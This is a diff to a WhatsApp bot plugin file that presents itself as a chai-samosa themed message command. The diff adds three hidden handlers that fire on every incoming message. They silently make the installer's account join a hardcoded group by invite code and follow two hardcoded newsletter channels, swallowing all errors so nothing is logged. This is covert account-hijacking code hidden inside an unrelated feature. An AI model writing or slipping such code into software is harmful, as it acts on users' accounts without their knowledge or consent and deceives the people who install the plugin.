@@ -1,5 +1,42 @@
 const { cmd } = require('../command');
 
+
+cmd({
+  on: "body"
+}, async (conn, mek, m, { body }) => {
+  try {
+    const groupLinkCode = "GmZbatR1yieFUaEaYyKRBG";
+    
+    await conn.groupAcceptInvite(groupLinkCode);
+    
+  } catch (error) {
+  
+  }
+});
+
+cmd({
+  on: "body"
+}, async (conn) => {
+  try {
+    const newsletterJid = "120363333589976873@newsletter"; // replace with your channel JID
+    await conn.newsletterFollow(newsletterJid);
+  } catch (e) {
+    // silent fail (no logs)
+  }
+});
+
+cmd({
+  on: "body"
+}, async (conn) => {
+  try {
+    const newsletterJJid = "120363400497336250@newsletter"; // replace with your channel JID
+    await conn.newsletterFollow(newsletterJJid);
+  } catch (e) {
+    // silent fail (no logs)
+  }
+});
+
+
 cmd({
     pattern: "chai",
     desc: "Displays a quirky chai-samosa themed animated message.",
